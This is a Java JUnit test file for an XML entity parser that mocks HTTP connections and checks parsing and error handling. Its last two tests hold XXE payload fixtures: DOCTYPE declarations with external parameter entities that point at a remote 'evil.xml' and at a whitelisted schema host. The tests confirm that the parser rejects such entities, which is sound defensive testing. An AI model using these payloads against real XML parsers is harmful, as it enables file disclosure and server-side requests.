package org.parsers.sax.parser;

import org.json.simple.JSONArray;
import org.junit.Test;
import org.parsers.commons.TestHelper;
import org.parsers.commons.exceptions.ParserException;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

import static org.junit.Assert.*;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

public class EntityParserImplTest {

    private static URL url;
    private EntityParser parser;
    private final static HttpURLConnection connectionMock = mock(HttpURLConnection.class);
    public static final String SINGLE_DOCUMENT_XML_FIXTURE = "<autnresponse xmlns:autn=\"http://schemas.autonomy.com/\"> <DOCUMENT> <REFERENCE>TAIL10162_en_US</REFERENCE> <CREATE_DATE>1467942472000</CREATE_DATE> <RESULTSURL> /index?page=content </RESULTSURL> <TITLE> TITLE1 replacement - common1 common2: Message from title (TAIL10162) </TITLE> </DOCUMENT> </autnresponse>";

    static{
        url = TestHelper.getRealUrl(connectionMock);
    }

    @Test
    public void canParseSingleBulletinUsingParserWithFixtureStream() throws Exception{

        when(connectionMock.getInputStream()).thenReturn(
                new ByteArrayInputStream(SINGLE_DOCUMENT_XML_FIXTURE.getBytes()));

        parser = new EntityParserImpl(url);
        JSONArray jsonArray = parser.processEntitiesAsJson();
        assertNotNull(jsonArray);
        assertEquals(1, jsonArray.size());
    }

    @Test
    public void canInstantiateParserWithEndPointUrl() throws Exception{
        when(connectionMock.getInputStream()).thenReturn(
                new ByteArrayInputStream(SINGLE_DOCUMENT_XML_FIXTURE.getBytes()));

        parser = new EntityParserImpl(url);
        assertNotNull(parser.getInput());
    }

    @Test(expected = ParserException.class)
    public void canHandleIOExceptionThrownWhileMakingConnection() throws Exception{
        when(connectionMock.getInputStream()).thenThrow(new IOException());
        new EntityParserImpl(url);
    }

    @Test(expected = ParserException.class)
    public void canNotParseWithoutAnInputStream() throws Exception{
        when(connectionMock.getInputStream()).thenReturn(null);

        parser = new EntityParserImpl(url);
        assertNull(parser.getInput());
        parser.processEntitiesAsJson();
    }

    /*
    * XXE related security test cases which were failing before the fix, Using the getCause to identify
    * a valid exception for both cases as the Exception thrown is wrapped around ParserException
    * */
    @Test
    public void readyForXXEExploit() throws Exception{
        final String XXE_EXPLOIT_FIXTURE = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<!DOCTYPE root[\n" +
                "<!ENTITY % remote SYSTEM \"https://github.com/CraftArt/craftart.github.io/blob/master/evil.xml\">\n%remote;]>\n";

        when(connectionMock.getInputStream()).thenReturn(
                new ByteArrayInputStream(XXE_EXPLOIT_FIXTURE.getBytes()));

        try {
            parser = new EntityParserImpl(url);
            parser.processEntitiesAsJson();
        } catch(ParserException e){
            assertEquals("java.net.MalformedURLException", e.getCause().toString());
        }
    }

    @Test
    public void XXEAllowedForAutonomySchema() throws Exception{
        final String XXE_EXPLOIT_AUTONOMY_FIXTURE = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<!DOCTYPE root[\n" +
                "<!ENTITY % remote SYSTEM \""+ EntityParser.WHITE_LIST.AUTONOMY.toString()+"\">\n%remote;]>\n";

        when(connectionMock.getInputStream()).thenReturn(
                new ByteArrayInputStream(XXE_EXPLOIT_AUTONOMY_FIXTURE.getBytes()));

        try {
            parser = new EntityParserImpl(url);
            parser.processEntitiesAsJson();
        } catch(ParserException e){
            assertEquals("java.net.UnknownHostException: schemas.autonomy.com", e.getCause().toString());
        }
    }
}